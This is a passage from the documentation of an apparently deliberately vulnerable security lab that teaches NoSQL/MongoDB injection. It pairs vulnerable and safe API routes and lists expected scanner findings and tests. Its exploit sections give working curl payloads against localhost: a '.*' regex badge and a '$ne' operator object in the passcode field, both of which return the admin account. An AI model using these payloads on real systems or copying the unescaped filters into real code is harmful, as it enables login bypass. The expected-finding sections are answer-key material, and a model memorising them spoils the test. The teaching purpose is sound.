| `pages/api/workshop/desk/renew.js` | vulnerable | The reset code goes to the filter as it arrives and the check only asks it is truthy; the row it finds is updated with a caller password. |
| `pages/api/workshop/desk/refresh.js` | protected | The one-time code is hashed before the query; any value becomes the digest text of its string form. |

The control is scoped to this flaw.

<a id="mongo-036-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route (and the read-back sign-in) and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-037"></a>
## MONGO-037 · An unescaped badge pattern

<a id="mongo-037-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/desk/scan.js` |
| Safe control | `pages/api/workshop/desk/tap.js` |
| Other safe cases | `pages/api/workshop/desk/wave.js` |
| Route | `POST /api/workshop/desk/scan` vs `/api/workshop/desk/tap` |
| Flow | body `badge` (text) → template into a `RegExp` → `find` |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe sources.

[Student guide](#mongo-037-student) · [Exploit lab](#mongo-037-exploit) · [Vuln vs protected](#mongo-037-safe) · [Tests](#mongo-037-tests)

<a id="mongo-037-student"></a>
### Student guide

The badge is a string — the checks pin its type and length — but its characters are not escaped before they become a regular expression. `.*` passes every check (two characters!) and then matches any badge. The twins show the two escaping patterns: a full metacharacter escape (`literal()`), and a per-character transform that places every non-word character in a closed one-member class.

<a id="mongo-037-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to all three routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/scan -H 'Content-Type: application/json' \
  -d '{"badge":".*"}'
# person: admin

curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/tap -H 'Content-Type: application/json' \
  -d '{"badge":".*"}'
# person: null

curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/wave -H 'Content-Type: application/json' \
  -d '{"badge":".*"}'
# person: null
```

**Observation that proves exploitation:** only the unescaped route returns `person` `admin`.

<a id="mongo-037-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/desk/scan.js` | vulnerable | The badge is a string, but its characters are not escaped; regex metacharacters turn the badge equality into a pattern. |
| `pages/api/workshop/desk/tap.js` | protected | `literal()` escapes `\ ^ $ . * + ? ( ) [ ] { } \| / -`, the full set a pattern can use. |
| `pages/api/workshop/desk/wave.js` | protected | Every non-word character becomes a one-member class `[\…]`, closed and literal under both the server's PCRE and a JavaScript reading. |

The control is scoped to this flaw.

<a id="mongo-037-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on each safe route; every route accepts ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-038"></a>
## MONGO-038 · One field coerced, its pair raw

<a id="mongo-038-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/desk/shift.js` |
| Safe control | `pages/api/workshop/desk/begin.js` |
| Route | `POST /api/workshop/desk/shift` vs `/api/workshop/desk/begin` |
| Flow | body `login` → template string; body `passcode` raw → `byPair` → `findOne` filter |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-038-student) · [Exploit lab](#mongo-038-exploit) · [Vuln vs protected](#mongo-038-safe) · [Tests](#mongo-038-tests)

<a id="mongo-038-student"></a>
### Student guide

`` `${login}` `` is a coercion: whatever arrives becomes text. But it runs on the login only, and the passcode is handed to the same helper unchanged, so the filter ends up holding one string and one object. The twin coerces both values (via `[value].join()`) — the coercion is only a control when it covers every value that reaches the query.

<a id="mongo-038-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/shift -H 'Content-Type: application/json' \
  -d '{"login":"admin","passcode":{"$ne":""}}'
# person: admin

curl -s -X POST http://127.0.0.1:3000/api/workshop/desk/begin -H 'Content-Type: application/json' \
  -d '{"login":"admin","passcode":{"$ne":""}}'
# person: null
```

**Observation that proves exploitation:** the half-coerced route answers `person` `admin`; the fully coerced twin finds nobody.

<a id="mongo-038-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/desk/shift.js` | vulnerable | `` `${login}` `` coerces the login only; the passcode keeps its object shape in the filter. |
| `pages/api/workshop/desk/begin.js` | protected | The array-join text conversion runs on every value; an object becomes `[object Object]`. |

The control is scoped to this flaw.

<a id="mongo-038-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.
